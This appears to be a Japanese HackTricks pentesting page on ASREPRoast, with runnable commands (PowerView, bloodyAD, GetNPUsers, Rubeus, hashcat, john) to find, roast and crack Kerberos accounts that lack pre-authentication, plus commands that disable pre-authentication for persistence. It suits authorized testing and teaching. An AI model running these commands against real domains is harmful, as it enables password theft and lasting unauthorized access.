# ASREPRoast

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースのハッキングの世界に追いつく

**最新のアナウンスメント**\
最新のバグバウンティの開始と重要なプラットフォームの更新情報を入手する

**今すぐ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **に参加して、トップハッカーとのコラボレーションを始めましょう！**

## ASREPRoast

ASREPRoast攻撃は、**Kerberos事前認証が必要でない属性を持つユーザー**（[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_）を探します。

これは、誰でもそれらのユーザーの代わりにDCにAS\_REQリクエストを送信し、AS\_REPメッセージを受け取ることができることを意味します。この最後の種類のメッセージには、元のユーザーキーで暗号化されたデータのチャンクが含まれており、そのキーはユーザーのパスワードから派生しています。このメッセージを使用して、ユーザーパスワードをオフラインでクラックすることができます。

さらに、この攻撃を実行するために**ドメインアカウントは必要ありません**。DCへの接続のみが必要です。しかし、**ドメインアカウントがある場合**、LDAPクエリを使用してドメイン内の**Kerberos事前認証がないユーザーを取得**することができます。**そうでなければユーザー名を推測する必要があります**。

#### 脆弱なユーザーの列挙（ドメイン資格情報が必要）

{% code title="Windowsを使用する" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
```
{% endcode %}

{% code title="Linuxを使用する" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REPメッセージのリクエスト

{% code title="Linux使用時" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
```
{% endcode %}

{% code title="Windowsを使用する場合" %}
```
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeusを使用したAS-REP Roastingは、暗号化タイプが0x17で、事前認証タイプが0の4768を生成します。
{% endhint %}

### クラッキング
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 永続性

**GenericAll** 権限（またはプロパティ書き込み権限）を持つユーザーに対して、**preauth** が不要になるように強制します：

{% code title="Windowsを使用して" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
```
{% endcode %}

{% code title="Linuxを使用する" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
```
## 参考文献

[**ired.teamでのAS-REPロースティングについての詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターと交流するために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ

**最新の発表**\
新しく始まるバグバウンティや重要なプラットフォームの更新情報を入手する

**今すぐ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **に参加して、トップハッカーとのコラボレーションを始めましょう！**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでAWSハッキングを学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
```
